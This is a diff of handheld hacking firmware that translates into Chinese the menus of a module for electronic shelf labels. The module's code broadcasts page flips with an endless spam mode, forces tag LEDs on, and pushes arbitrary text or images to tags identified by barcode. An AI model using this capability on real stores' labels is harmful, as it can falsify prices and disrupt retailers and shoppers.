@@ -54319,25 +54616,25 @@ void tt_do_transmit_single(const char* title) {
 bool tt_result_screen(const char* title) {
     delay(100);
     M5.Display.clear();
-    M5.Display.setTextFont(1);
+    evilKeepCnFont(M5.Display);
     M5.Display.fillRect(0, 0, 240, 18, TFT_NAVY);
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setCursor(5, 3);
     M5.Display.setTextColor(TFT_WHITE);
     M5.Display.print(title);
 
-    M5.Display.setTextSize(2);
+    evilSetCnFont(M5.Display, 2);
     M5.Display.setCursor(30, 45);
     M5.Display.setTextColor(tt_ir_stop_requested ? TFT_ORANGE : TFT_GREEN);
-    M5.Display.println(tt_ir_stop_requested ? "Stopped" : "Complete!");
+    M5.Display.println(tt_ir_stop_requested ? "已停止" : "发送完成!");
 
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setCursor(10, 90);
     M5.Display.setTextColor(TFT_CYAN);
-    M5.Display.print("[ENTER] Replay");
+    M5.Display.print("[ENTER] 重发");
     M5.Display.setCursor(10, 108);
     M5.Display.setTextColor(TFT_ORANGE);
-    M5.Display.print("[BACK] Return");
+    M5.Display.print("[BACK] 返回");
     M5.Display.display();
 
     delay(300);
@@ -54379,8 +54676,8 @@ bool tt_send_tristate(const uint8_t* tri, uint16_t w, uint16_t h, const uint8_t*
         if (!ok) return false;
     }
     tt_tx_progress = 0;
-    tt_transmit_sequence_inline("Sending");
-    tt_result_screen("Sent");
+    tt_transmit_sequence_inline("正在发送");
+    tt_result_screen("已发送");
     return true;
 }
 
@@ -54392,12 +54689,12 @@ void tt_broadcast_page_flip() {
     bool spam = false;
 
     std::vector<TtMenuItem> cfg;
-    cfg.push_back(ttItem([&](){ return "Page: " + String(page); }, [&](){ page = (page + tt_dir + 8) % 8; }, false));
-    cfg.push_back(ttItem([&](){ return "Duration: " + String(duration) + "s"; }, [&](){ duration = (tt_dir > 0) ? ((duration >= 60) ? 5 : duration + 5) : ((duration <= 5) ? 60 : duration - 5); }, false));
-    cfg.push_back(ttItem([&](){ return String("Forever: ") + (forever ? "ON" : "OFF"); }, [&](){ forever = !forever; }, false));
-    cfg.push_back(ttItem([&](){ return "Repeats: " + String(repeats); }, [&](){ if (tt_dir > 0) { if (repeats >= 500) repeats = 50; else repeats += 50; } else { if (repeats <= 50) repeats = 500; else repeats -= 50; } }, false));
-    cfg.push_back(ttItem([&](){ return String("Spam: ") + (spam ? "ON" : "OFF"); }, [&](){ spam = !spam; }, false));
-    cfg.push_back({[](){ return String(">> TRANSMIT <<"); }, [&]() {
+    cfg.push_back(ttItem([&](){ return "页面: " + String(page); }, [&](){ page = (page + tt_dir + 8) % 8; }, false));
+    cfg.push_back(ttItem([&](){ return "持续时间: " + String(duration) + "s"; }, [&](){ duration = (tt_dir > 0) ? ((duration >= 60) ? 5 : duration + 5) : ((duration <= 5) ? 60 : duration - 5); }, false));
+    cfg.push_back(ttItem([&](){ return String("永久保持: ") + (forever ? "开" : "关"); }, [&](){ forever = !forever; }, false));
+    cfg.push_back(ttItem([&](){ return "重复次数: " + String(repeats); }, [&](){ if (tt_dir > 0) { if (repeats >= 500) repeats = 50; else repeats += 50; } else { if (repeats <= 50) repeats = 500; else repeats -= 50; } }, false));
+    cfg.push_back(ttItem([&](){ return String("连续连发: ") + (spam ? "开" : "关"); }, [&](){ spam = !spam; }, false));
+    cfg.push_back({[](){ return String(">> 发射 <<"); }, [&]() {
         uint8_t buf[TT_MAX_FRAME_SIZE];
         size_t len = tt_make_broadcast_page_frame(buf, page, forever, duration);
         memcpy(tt_current_job.frame_data, buf, len);
@@ -54405,11 +54702,11 @@ void tt_broadcast_page_flip() {
         tt_current_job.gap_delay = 2;
         tt_current_job.repeats = spam ? 0xFFFF : repeats;
         while (true) {
-            tt_do_transmit_single(spam ? "BC Page (Spam)" : "BC Page Flip");
-            if (!tt_result_screen("Broadcast Page Flip")) break;
+            tt_do_transmit_single(spam ? "广播翻页 (连发)" : "广播翻页");
+            if (!tt_result_screen("广播翻页")) break;
         }
     }, true});
-    tt_menu(cfg, "Broadcast Page Flip");
+    tt_menu(cfg, "广播翻页");
 }
 
 void tt_broadcast_led() {
@@ -54429,8 +54726,8 @@ void tt_broadcast_debug() {
     tt_current_job.gap_delay = 2;
 
     while (true) {
-        tt_do_transmit_single("BC Debug Screen");
-        if (!tt_result_screen("Broadcast Debug")) break;
+        tt_do_transmit_single("广播调试屏");
+        if (!tt_result_screen("广播调试")) break;
     }
 }
 
@@ -54440,7 +54737,7 @@ void tt_ping_tag() {
 
     uint8_t plid[4];
     if (!tt_barcode_to_plid(barcode.c_str(), plid)) {
-        tt_show_error("Invalid barcode");
+        tt_show_error("条码无效");
         return;
     }
 
@@ -54453,8 +54750,8 @@ void tt_ping_tag() {
     tt_current_job.gap_delay = 2;
 
     while (true) {
-        tt_do_transmit_single("Ping Tag");
-        if (!tt_result_screen("Ping Tag")) break;
+        tt_do_transmit_single("Ping 标签");
+        if (!tt_result_screen("Ping 标签")) break;
     }
 }
 
@@ -54472,13 +54769,13 @@ void tt_led_send(const uint8_t plid[4], uint8_t mode, uint16_t duration) {
     tt_current_job.repeats = 160;
     tt_current_job.gap_delay = 2;
     tt_tx_total = 0;
-    tt_transmit_single_inline("Ping (wake)");
+    tt_transmit_single_inline("Ping (唤醒)");
 
     memcpy(tt_current_job.frame_data, led_buf, led_len);
     tt_current_job.frame_len = led_len;
     tt_current_job.repeats = 80;
     tt_current_job.gap_delay = 2;
-    tt_transmit_single_inline("LED CMD");
+    tt_transmit_single_inline("LED 指令");
 }
 
 void tt_led_test_with_plid(const uint8_t plid[4]) {
@@ -54487,28 +54784,28 @@ void tt_led_test_with_plid(const uint8_t plid[4]) {
     bool fastBlink = true;
 
     std::vector<TtMenuItem> cfg;
-    cfg.push_back(ttItem([&](){ return "Duration: " + String(ledDuration) + "s"; }, [&](){
+    cfg.push_back(ttItem([&](){ return "持续时间: " + String(ledDuration) + "s"; }, [&](){
         if (tt_dir > 0) { if (ledDuration >= 300) ledDuration = 5;
         else if (ledDuration >= 60) ledDuration += 60;
         else ledDuration += 5; } else { if (ledDuration <= 5) ledDuration = 300; else if (ledDuration > 60) ledDuration -= 60; else ledDuration -= 5; }
     }, false));
-    cfg.push_back(ttItem([&](){ return String("Power: ") + (highPower ? "HIGH" : "LOW"); }, [&](){ highPower = !highPower; }, false));
-    cfg.push_back(ttItem([&](){ return String("Blink: ") + (fastBlink ? "Fast" : "Slow"); }, [&](){ fastBlink = !fastBlink; }, false));
-    cfg.push_back({[](){ return String(">> LED ON <<"); }, [&](){
+    cfg.push_back(ttItem([&](){ return String("功率: ") + (highPower ? "高" : "低"); }, [&](){ highPower = !highPower; }, false));
+    cfg.push_back(ttItem([&](){ return String("闪烁: ") + (fastBlink ? "快" : "慢"); }, [&](){ fastBlink = !fastBlink; }, false));
+    cfg.push_back({[](){ return String(">> 开启 LED <<"); }, [&](){
         uint8_t mode = (fastBlink ? 0x49 : 0x41) | (highPower ? 0x80 : 0x00);
         tt_led_send(plid, mode, ledDuration);
-        tt_result_screen("LED ON");
+        tt_result_screen("开启 LED");
     }, true});
-    cfg.push_back({[](){ return String(">> LED FOREVER <<"); }, [&](){
+    cfg.push_back({[](){ return String(">> LED 常亮 <<"); }, [&](){
         uint8_t mode = (fastBlink ? 0xC9 : 0xC1);
         tt_led_send(plid, mode, 0);
-        tt_result_screen("LED FOREVER");
+        tt_result_screen("LED 常亮");
     }, true});
-    cfg.push_back({[](){ return String(">> LED OFF <<"); }, [&](){
+    cfg.push_back({[](){ return String(">> 关闭 LED <<"); }, [&](){
         tt_led_send(plid, 0x49, 1);
-        tt_result_screen("LED OFF (1s)");
+        tt_result_screen("关闭 LED (1s)");
     }, true});
-    tt_menu(cfg, "LED Test");
+    tt_menu(cfg, "LED 测试");
 }
 
 void tt_led_test() {
@@ -54516,7 +54813,7 @@ void tt_led_test() {
     if (barcode.length() != TT_BC_LEN) return;
     uint8_t plid[4];
     if (!tt_barcode_to_plid(barcode.c_str(), plid)) {
-        tt_show_error("Invalid barcode");
+        tt_show_error("条码无效");
         return;
     }
     tt_led_test_with_plid(plid);
@@ -54528,7 +54825,7 @@ void tt_push_text() {
 
     uint8_t plid[4];
     if (!tt_barcode_to_plid(barcode.c_str(), plid)) {
-        tt_show_error("Invalid barcode");
+        tt_show_error("条码无效");
         return;
     }
 
@@ -54539,7 +54836,7 @@ void tt_push_text() {
     uint16_t h = profile.known ? profile.height : 128;
 
     if (w == 0 || h == 0) {
-        tt_show_error("Segment tag - no gfx");
+        tt_show_error("段码屏不支持图形");
         return;
     }
 
@@ -54563,23 +54860,23 @@ void tt_push_text() {
     cfg.push_back(ttItem([&](){
         int cw = 6 * tt_text_size, ch = 8 * tt_text_size;
         int maxCh = ((w - 4) / cw) * ((h - 4) / ch);
-        if (textLen > maxCh) return "Size: " + String(tt_text_size) + " OVERFLOW! max " + maxCh;
-        return "Size: " + String(tt_text_size) + " (" + textLen + "/" + maxCh + ")";
+        if (textLen > maxCh) return "字号: " + String(tt_text_size) + " 超长! 最多 " + maxCh;
+        return "字号: " + String(tt_text_size) + " (" + textLen + "/" + maxCh + ")";
     }, [](){ tt_text_size = (tt_dir > 0) ? ((tt_text_size >= 10) ? 1 : tt_text_size + 1) : ((tt_text_size <= 1) ? 10 : tt_text_size - 1); }, false));
-    cfg.push_back(ttItem([](){ return String("Font: ") + tt_font_names[tt_font_idx]; }, [](){ tt_font_idx = (tt_font_idx + tt_dir + TT_FONT_COUNT) % TT_FONT_COUNT; }, false));
-    cfg.push_back(ttItem([](){ return "Page: " + String(tt_page); }, [](){ tt_page = (tt_page + tt_dir + 8) % 8; }, false));
-    cfg.push_back(ttItem([](){ return "Offset X: " + String(tt_pos_x); }, [&](){ tt_pos_x = (tt_dir > 0) ? ((tt_pos_x + 5 > w) ? 0 : tt_pos_x + 5) : ((tt_pos_x < 5) ? 0 : tt_pos_x - 5); }, false));
-    cfg.push_back(ttItem([](){ return "Offset Y: " + String(tt_pos_y); }, [&](){ tt_pos_y = (tt_dir > 0) ? ((tt_pos_y + 5 > h) ? 0 : tt_pos_y + 5) : ((tt_pos_y < 5) ? 0 : tt_pos_y - 5); }, false));
+    cfg.push_back(ttItem([](){ return String("字体: ") + tt_font_names[tt_font_idx]; }, [](){ tt_font_idx = (tt_font_idx + tt_dir + TT_FONT_COUNT) % TT_FONT_COUNT; }, false));
+    cfg.push_back(ttItem([](){ return "页面: " + String(tt_page); }, [](){ tt_page = (tt_page + tt_dir + 8) % 8; }, false));
+    cfg.push_back(ttItem([](){ return "X 偏移: " + String(tt_pos_x); }, [&](){ tt_pos_x = (tt_dir > 0) ? ((tt_pos_x + 5 > w) ? 0 : tt_pos_x + 5) : ((tt_pos_x < 5) ? 0 : tt_pos_x - 5); }, false));
+    cfg.push_back(ttItem([](){ return "Y 偏移: " + String(tt_pos_y); }, [&](){ tt_pos_y = (tt_dir > 0) ? ((tt_pos_y + 5 > h) ? 0 : tt_pos_y + 5) : ((tt_pos_y < 5) ? 0 : tt_pos_y - 5); }, false));
     if (hasColor) {
-        const char* fgN[] = {"White", "Black", "Red"};
-        const char* bgN[] = {"White", "Black", "Red"};
-        cfg.push_back(ttItem([&](){ return String("Text: ") + fgN[txtFg]; }, [&](){ txtFg = (txtFg + tt_dir + 3) % 3; }, false));
-        cfg.push_back(ttItem([&](){ return String("BG: ") + bgN[txtBg]; }, [&](){ txtBg = (txtBg + tt_dir + 3) % 3; }, false));
+        const char* fgN[] = {"白", "黑", "红"};
+        const char* bgN[] = {"白", "黑", "红"};
+        cfg.push_back(ttItem([&](){ return String("文字色: ") + fgN[txtFg]; }, [&](){ txtFg = (txtFg + tt_dir + 3) % 3; }, false));
+        cfg.push_back(ttItem([&](){ return String("背景色: ") + bgN[txtBg]; }, [&](){ txtBg = (txtBg + tt_dir + 3) % 3; }, false));
     } else {
-        cfg.push_back(ttItem([](){ return String("Invert: ") + (tt_invert ? "ON" : "OFF"); }, [](){ tt_invert = !tt_invert; }, false));
+        cfg.push_back(ttItem([](){ return String("反色: ") + (tt_invert ? "开" : "关"); }, [](){ tt_invert = !tt_invert; }, false));
     }
-    cfg.push_back(ttItem([](){ return String("Compress: ") + (tt_comp_mode == TT_COMP_AUTO ? "Auto" : tt_comp_mode == TT_COMP_RAW ? "Raw" : "RLE"); }, [](){ tt_comp_mode = (tt_comp_mode + tt_dir + 3) % 3; }, false));
-    cfg.push_back({[](){ return String("Preview"); }, [&](){
+    cfg.push_back(ttItem([](){ return String("压缩: ") + (tt_comp_mode == TT_COMP_AUTO ? "自动" : tt_comp_mode == TT_COMP_RAW ? "原始" : "RLE"); }, [](){ tt_comp_mode = (tt_comp_mode + tt_dir + 3) % 3; }, false));
+    cfg.push_back({[](){ return String("预览"); }, [&](){
         uint8_t* txt = tt_render_text(text.c_str(), w, h, tt_text_size, false, tt_pos_x, tt_pos_y);
         if (!txt) return;
         uint8_t* pri = (uint8_t*)calloc(pc, 1);
@@ -54592,29 +54889,29 @@ void tt_push_text() {
             pri[i] = (fg == 0) ? 1 : 0;
             if (hasColor) col[i] = (fg == 2) ? 0 : 1;
         }
-        M5.Display.fillScreen(TFT_BLACK); M5.Display.setTextFont(1);
+        M5.Display.fillScreen(TFT_BLACK); evilKeepCnFont(M5.Display);
         M5.Display.fillRect(0, 0, 240, 18, TFT_NAVY);
-        M5.Display.setTextSize(1.5); M5.Display.setCursor(5, 3);
+        evilSetCnFont(M5.Display, 1.5); M5.Display.setCursor(5, 3);
         M5.Display.setTextColor(TFT_GREEN);
-        M5.Display.printf("%ux%u sz%d", w, h, tt_text_size);
+        M5.Display.printf("%ux%u 字号%d", w, h, tt_text_size);
         if (hasColor) tt_preview_color(pri, col, w, h, 20);
         else tt_preview_pixels(pri, w, h, 20);
         M5.Display.display(); free(txt); free(pri); free(col);
         delay(200); while (true) { cardUpdate(); if (kp(KEY_BACKSPACE)||kp(KEY_ENTER)) break; delay(50); } delay(150);
     }, true});
-    cfg.push_back({[](){ return String(">> SEND <<"); }, [&](){
+    cfg.push_back({[](){ return String(">> 发送 <<"); }, [&](){
         uint8_t* txt = tt_render_text(text.c_str(), w, h, tt_text_size, false, tt_pos_x, tt_pos_y);
-        if (!txt) { tt_show_error("Memory"); return; }
+        if (!txt) { tt_show_error("内存不足"); return; }
         if (!hasColor) {
             // Simple mono path: stream directly from packed/raw buffer
-            bool ok = tt_stream_image(plid, txt, w, h, tt_page, tt_wake_repeats_val, false, tt_comp_mode, "Push Text");
+            bool ok = tt_stream_image(plid, txt, w, h, tt_page, tt_wake_repeats_val, false, tt_comp_mode, "推送文本");
             free(txt);
-            if (!ok) { tt_show_error("Encode err"); return; }
+            if (!ok) { tt_show_error("编码错误"); return; }
         } else {
             // Color path: expand to two planes first
             uint8_t* pri = (uint8_t*)calloc(pc, 1);
             uint8_t* col = (uint8_t*)malloc(pc);
-            if (!pri || !col) { free(txt); free(pri); free(col); tt_show_error("Memory"); return; }
+            if (!pri || !col) { free(txt); free(pri); free(col); tt_show_error("内存不足"); return; }
             memset(col, 1, pc);
             for (size_t i = 0; i < pc; i++) {
                 bool lit = (txt[0] == 0xFE) ? ((txt[1 + i/8] >> (7 - (i%8))) & 1) : (txt[i] != 0);
@@ -54626,13 +54923,13 @@ void tt_push_text() {
             memset(&tt_current_seq, 0, sizeof(tt_current_seq));
             bool ok = tt_build_image_sequence_planes(&tt_current_seq, plid, pri, col, w, h, tt_page, 0, 0, tt_wake_repeats_val, tt_comp_mode);
             free(pri); free(col);
-            if (!ok) { tt_show_error("Encode err"); return; }
+            if (!ok) { tt_show_error("编码错误"); return; }
             tt_tx_progress = 0;
-            tt_transmit_sequence_inline("Push Text");
+            tt_transmit_sequence_inline("推送文本");
         }
-        tt_result_screen("Push Text");
+        tt_result_screen("推送文本");
     }, true});
-    tt_menu(cfg, "Push Text Config");
+    tt_menu(cfg, "推送文本配置");
 }
 
 void tt_show_tag_info() {
@@ -54650,57 +54947,57 @@ void tt_show_tag_info() {
     snprintf(plidStr, sizeof(plidStr), "%02X:%02X:%02X:%02X", plid[0], plid[1], plid[2], plid[3]);
 
     std::vector<TtMenuItem> info;
-    info.push_back(ttItem([&](){ return "BC: " + barcode; }, [](){}, false));
+    info.push_back(ttItem([&](){ return "条码: " + barcode; }, [](){}, false));
     info.push_back(ttItem([plidStr](){ return String("PLID: ") + plidStr; }, [](){}, false));
-    info.push_back(ttItem([&](){ return "Type: " + String(profile.type_code); }, [](){}, false));
-    info.push_back(ttItem([validCS](){ return String("Checksum: ") + (validCS ? "Valid" : "INVALID"); }, [](){}, false));
+    info.push_back(ttItem([&](){ return "类型码: " + String(profile.type_code); }, [](){}, false));
+    info.push_back(ttItem([validCS](){ return String("校验和: ") + (validCS ? "有效" : "无效"); }, [](){}, false));
     {
         int prodLine = (barcode[2]-'0')*10 + (barcode[3]-'0');
         int prodDate = (barcode[4]-'0')*100 + (barcode[5]-'0')*10 + (barcode[6]-'0');
         int yr = 2000 + prodDate/100, wk = prodDate%100;
-        char meta[48]; snprintf(meta, sizeof(meta), "Prod: F%02d %dw%02d Serial:%s", prodLine, yr, wk, barcode.substring(7,12).c_str());
+        char meta[48]; snprintf(meta, sizeof(meta), "批次: F%02d %dw%02d 序列:%s", prodLine, yr, wk, barcode.substring(7,12).c_str());
         info.push_back(ttItem([meta](){ return String(meta); }, [](){}, false));
     }
 
     if (profile.known) {
         if (profile.model_name)
-            info.push_back(ttItem([&](){ return String("Model: ") + profile.model_name; }, [](){}, false));
+            info.push_back(ttItem([&](){ return String("型号: ") + profile.model_name; }, [](){}, false));
 
-        info.push_back(ttItem([&](){ return "Display: " + String(profile.width) + "x" + String(profile.height); }, [](){}, false));
+        info.push_back(ttItem([&](){ return "分辨率: " + String(profile.width) + "x" + String(profile.height); }, [](){}, false));
 
-        info.push_back(ttItem([&](){ return String("Kind: ") + (profile.kind == TT_KIND_DOTMATRIX ? "Dot Matrix" : "Segment"); }, [](){}, false));
+        info.push_back(ttItem([&](){ return String("屏型: ") + (profile.kind == TT_KIND_DOTMATRIX ? "点阵屏" : "段码屏"); }, [](){}, false));
 
-        const char* colStr = profile.color == TT_COLOR_RED ? "Red" : profile.color == TT_COLOR_YELLOW ? "Yellow" : "Mono";
-        info.push_back(ttItem([colStr](){ return String("Color: ") + colStr; }, [](){}, false));
+        const char* colStr = profile.color == TT_COLOR_RED ? "红" : profile.color == TT_COLOR_YELLOW ? "黄" : "黑白";
+        info.push_back(ttItem([colStr](){ return String("颜色: ") + colStr; }, [](){}, false));
 
-        info.push_back(ttItem([&](){ return "Pages: 0-7"; }, [](){}, false));
+        info.push_back(ttItem([&](){ return "页数: 0-7"; }, [](){}, false));
 
-        info.push_back(ttItem([&](){ return "PL Bit: " + String(profile.pl_bit_def); }, [](){}, false));
+        info.push_back(ttItem([&](){ return "PL 位: " + String(profile.pl_bit_def); }, [](){}, false));
 
         size_t pixels = (size_t)profile.width * profile.height;
         size_t rawBytes = (pixels + 7) / 8;
         size_t frames = (rawBytes + 19) / 20;
-        info.push_back(ttItem([pixels](){ return "Pixels: " + String((uint32_t)pixels); }, [](){}, false));
-        info.push_back(ttItem([rawBytes](){ return "Raw size: " + String((uint32_t)rawBytes) + " B"; }, [](){}, false));
-        info.push_back(ttItem([frames](){ return "Frames: " + String((uint32_t)frames) + " (+ ping/param/refresh)"; }, [](){}, false));
+        info.push_back(ttItem([pixels](){ return "像素数: " + String((uint32_t)pixels); }, [](){}, false));
+        info.push_back(ttItem([rawBytes](){ return "原始大小: " + String((uint32_t)rawBytes) + " B"; }, [](){}, false));
+        info.push_back(ttItem([frames](){ return "帧数: " + String((uint32_t)frames) + " (+唤醒/参数/刷新)"; }, [](){}, false));
 
-        String compRec = (pixels > 5000) ? "RLE recommended" : "Raw OK";
-        info.push_back(ttItem([compRec](){ return "Compress: " + compRec; }, [](){}, false));
+        String compRec = (pixels > 5000) ? "推荐 RLE" : "原始即可";
+        info.push_back(ttItem([compRec](){ return "压缩建议: " + compRec; }, [](){}, false));
 
-        info.push_back({[](){ return String(">> Save Tag <<"); }, [&](){
-            String name = tt_get_text_input("Tag name", true);
+        info.push_back({[](){ return String(">> 保存标签 <<"); }, [&](){
+            String name = tt_get_text_input("标签名称", true);
             if (name.length() == 0 && profile.model_name) name = String(profile.model_name);
             if (name.length() == 0) name = barcode;
             if (tt_target_add(barcode.c_str(), name.c_str()))
-                tt_show_success("Tag saved!");
+                tt_show_success("标签已保存!");
             else
-                tt_show_error("Max tags reached");
+                tt_show_error("标签数量已满");
         }, true});
     } else {
-        info.push_back(ttItem([](){ return String("Unknown tag type"); }, [](){}, false));
+        info.push_back(ttItem([](){ return String("未知标签类型"); }, [](){}, false));
     }
 
-    tt_menu(info, "Tag Info");
+    tt_menu(info, "标签信息");
 }
 
 void tt_push_image() {
@@ -54709,7 +55006,7 @@ void tt_push_image() {
 
     uint8_t plid[4];
     if (!tt_barcode_to_plid(barcode.c_str(), plid)) {
-        tt_show_error("Invalid barcode");
+        tt_show_error("条码无效");
         return;
     }
 
@@ -54717,14 +55014,14 @@ void tt_push_image() {
     tt_barcode_to_profile(barcode.c_str(), &profile);
     uint16_t w = profile.known ? profile.width : 296;
     uint16_t h = profile.known ? profile.height : 128;
-    if (w == 0 || h == 0) { tt_show_error("Segment tag - no gfx"); return; }
+    if (w == 0 || h == 0) { tt_show_error("段码屏不支持图形"); return; }
 
     std::vector<String> bmpFiles;
     M5.Display.clear();
     M5.Display.fillRect(0, 0, 240, 18, TFT_NAVY);
-    M5.Display.setTextSize(1.5); M5.Display.setTextFont(1);
+    evilSetCnFont(M5.Display, 1.5); evilKeepCnFont(M5.Display);
     M5.Display.setCursor(5, 3); M5.Display.setTextColor(TFT_WHITE);
-    M5.Display.print("Scanning SD for BMP...");
+    M5.Display.print("扫描SD卡中的BMP...");
     M5.Display.display();
 
     {
@@ -54746,7 +55043,7 @@ void tt_push_image() {
     }
 
     if (bmpFiles.size() == 0) {
-        tt_show_error("No BMP on SD");
+        tt_show_error("SD卡中无BMP图片");
         return;
     }
 
@@ -54756,25 +55053,25 @@ void tt_push_image() {
         if (sn.length() > 28) sn = "..." + sn.substring(sn.length() - 25);
         bmpLabels.push_back(sn);
     }
-    int selectedIdx = tt_menu_select(bmpLabels, "Select BMP");
+    int selectedIdx = tt_menu_select(bmpLabels, "选择 BMP");
     if (selectedIdx < 0) return;
 
     String filePath = bmpFiles[selectedIdx];
 
     M5.Display.clear();
     M5.Display.fillRect(0, 0, 240, 18, TFT_NAVY);
-    M5.Display.setTextSize(1.5); M5.Display.setTextFont(1);
+    evilSetCnFont(M5.Display, 1.5); evilKeepCnFont(M5.Display);
     M5.Display.setCursor(5, 3); M5.Display.setTextColor(TFT_WHITE);
-    M5.Display.print("Loading BMP...");
+    M5.Display.print("正在加载 BMP...");
     M5.Display.display();
 
     File bmpFile = SD.open(filePath);
-    if (!bmpFile) { tt_show_error("Can't open file"); return; }
+    if (!bmpFile) { tt_show_error("无法打开文件"); return; }
 
     uint8_t header[54];
     if (bmpFile.read(header, 54) != 54 || header[0] != 'B' || header[1] != 'M') {
         bmpFile.close();
-        tt_show_error("Invalid BMP");
+        tt_show_error("无效的 BMP");
         return;
     }
 
@@ -54792,13 +55089,13 @@ void tt_push_image() {
     size_t packedSize = (pixelCount + 7) / 8;
     size_t bufSize = dualPlane ? (1 + 2 * packedSize) : (1 + packedSize);
     uint8_t* pixels = (uint8_t*)calloc(bufSize, 1);
-    if (!pixels) { bmpFile.close(); tt_show_error("Memory error"); return; }
+    if (!pixels) { bmpFile.close(); tt_show_error("内存不足"); return; }
     pixels[0] = dualPlane ? 0xFD : 0xFE;
     if (dualPlane) memset(pixels + 1 + packedSize, 0xFF, packedSize);
 
     int rowBytes = ((bmpW * bmpBpp / 8) + 3) & ~3;
     uint8_t* rowBuf = (uint8_t*)malloc(rowBytes);
-    if (!rowBuf) { free(pixels); bmpFile.close(); tt_show_error("Memory error"); return; }
+    if (!rowBuf) { free(pixels); bmpFile.close(); tt_show_error("内存不足"); return; }
 
     float scaleW = (float)w / bmpW, scaleH = (float)h / bmpH;
     float scale = (scaleW < scaleH) ? scaleW : scaleH;
@@ -54843,17 +55140,17 @@ void tt_push_image() {
 
     std::vector<TtMenuItem> icfg;
     icfg.push_back(ttItem([&](){ return String(w) + "x" + h + " BMP:" + bmpW + "x" + bmpH; }, [](){}, false));
-    icfg.push_back(ttItem([](){ return "Page: " + String(tt_page); }, [](){ tt_page = (tt_page + tt_dir + 8) % 8; }, false));
-    icfg.push_back(ttItem([&](){ return String("Invert: ") + (imgInvert ? "OFF" : "ON"); }, [&](){ imgInvert = !imgInvert; }, false));
+    icfg.push_back(ttItem([](){ return "页面: " + String(tt_page); }, [](){ tt_page = (tt_page + tt_dir + 8) % 8; }, false));
+    icfg.push_back(ttItem([&](){ return String("反色: ") + (imgInvert ? "关" : "开"); }, [&](){ imgInvert = !imgInvert; }, false));
     if (hasColor) {
-        icfg.push_back(ttItem([&](){ return String("Color: ") + (dualPlane ? "B/W/R" : "B/W"); }, [&](){ dualPlane = !dualPlane; }, false));
+        icfg.push_back(ttItem([&](){ return String("颜色: ") + (dualPlane ? "黑/白/红" : "黑/白"); }, [&](){ dualPlane = !dualPlane; }, false));
     }
-    icfg.push_back(ttItem([](){ return String("Compress: ") + (tt_comp_mode == TT_COMP_AUTO ? "Auto" : tt_comp_mode == TT_COMP_RAW ? "Raw" : "RLE"); }, [](){ tt_comp_mode = (tt_comp_mode + tt_dir + 3) % 3; }, false));
-    icfg.push_back({[](){ return String("Preview"); }, [&](){
-        M5.Display.clear(); M5.Display.setTextFont(1);
+    icfg.push_back(ttItem([](){ return String("压缩: ") + (tt_comp_mode == TT_COMP_AUTO ? "自动" : tt_comp_mode == TT_COMP_RAW ? "原始" : "RLE"); }, [](){ tt_comp_mode = (tt_comp_mode + tt_dir + 3) % 3; }, false));
+    icfg.push_back({[](){ return String("预览"); }, [&](){
+        M5.Display.clear(); evilKeepCnFont(M5.Display);
         M5.Display.fillRect(0, 0, 240, 18, TFT_NAVY);
-        M5.Display.setTextSize(1.5); M5.Display.setCursor(5, 3); M5.Display.setTextColor(TFT_WHITE);
-        M5.Display.printf("%s %ux%u%s", profile.model_name ? profile.model_name : "?", w, h, imgInvert ? " INV" : "");
+        evilSetCnFont(M5.Display, 1.5); M5.Display.setCursor(5, 3); M5.Display.setTextColor(TFT_WHITE);
+        M5.Display.printf("%s %ux%u%s", profile.model_name ? profile.model_name : "?", w, h, imgInvert ? " 反色" : "");
         size_t pbytes = (pixelCount + 7) / 8;
         if (dualPlane) {
             size_t pvSz = 1 + 2*pbytes;
@@ -54884,21 +55181,21 @@ void tt_push_image() {
         M5.Display.display();
         delay(200); while (true) { cardUpdate(); if (kp(KEY_BACKSPACE)||kp(KEY_ENTER)) break; delay(50); } delay(150);
     }, true});
-    icfg.push_back({[](){ return String(">> SEND <<"); }, [&](){
+    icfg.push_back({[](){ return String(">> 发送 <<"); }, [&](){
         // In-place invert to save 39KB heap for RLE encoding
         size_t pbytes = (pixelCount + 7) / 8;
         if (imgInvert && pixels[0] == 0xFE) {
             for (size_t i = 0; i < pbytes; i++) pixels[1+i] = ~pixels[1+i];
         }
-        bool ok = tt_stream_image(plid, pixels, w, h, tt_page, tt_wake_repeats_val, hasColor, tt_comp_mode, "Push Image");
+        bool ok = tt_stream_image(plid, pixels, w, h, tt_page, tt_wake_repeats_val, hasColor, tt_comp_mode, "推送图片");
         // Undo invert so preview still works
         if (imgInvert && pixels[0] == 0xFE) {
             for (size_t i = 0; i < pbytes; i++) pixels[1+i] = ~pixels[1+i];
         }
-        if (!ok) { tt_show_error("Encode err"); return; }
-        tt_result_screen("Push Image");
+        if (!ok) { tt_show_error("编码错误"); return; }
+        tt_result_screen("推送图片");
     }, true});
-    tt_menu(icfg, "Push Image Config");
+    tt_menu(icfg, "推送图片配置");
     free(pixels);
 }
 
@@ -54914,15 +55211,15 @@ void tt_target_actions(uint8_t idx) {
     while (running) {
         opts.clear();
         String title = String(tgt.name[0] ? tgt.name : tgt.barcode);
-        opts.push_back({"Change Page", [&]() {
+        opts.push_back({"切换页面", [&]() {
             uint8_t pg = 1; uint16_t dur = 10; bool fvr = false; uint16_t reps = 100; bool spm = false;
             std::vector<TtMenuItem> pcfg;
-            pcfg.push_back(ttItem([&](){ return "Page: " + String(pg); }, [&](){ pg = (pg + tt_dir + 8) % 8; }, false));
-            pcfg.push_back(ttItem([&](){ return "Duration: " + String(dur) + "s"; }, [&](){ if (tt_dir>0) { dur=(dur>=60)?5:dur+5; } else { dur=(dur<=5)?60:dur-5; } }, false));
-            pcfg.push_back(ttItem([&](){ return String("Forever: ") + (fvr?"ON":"OFF"); }, [&](){ fvr=!fvr; }, false));
-            pcfg.push_back(ttItem([&](){ return "Repeats: " + String(reps); }, [&](){ if(tt_dir>0){if(reps>=500)reps=50;else reps+=50;}else{if(reps<=50)reps=500;else reps-=50;} }, false));
-            pcfg.push_back(ttItem([&](){ return String("Spam: ") + (spm?"ON":"OFF"); }, [&](){ spm=!spm; }, false));
-            pcfg.push_back({[](){ return String(">> FLIP <<"); }, [&](){
+            pcfg.push_back(ttItem([&](){ return "页面: " + String(pg); }, [&](){ pg = (pg + tt_dir + 8) % 8; }, false));
+            pcfg.push_back(ttItem([&](){ return "持续时间: " + String(dur) + "s"; }, [&](){ if (tt_dir>0) { dur=(dur>=60)?5:dur+5; } else { dur=(dur<=5)?60:dur-5; } }, false));
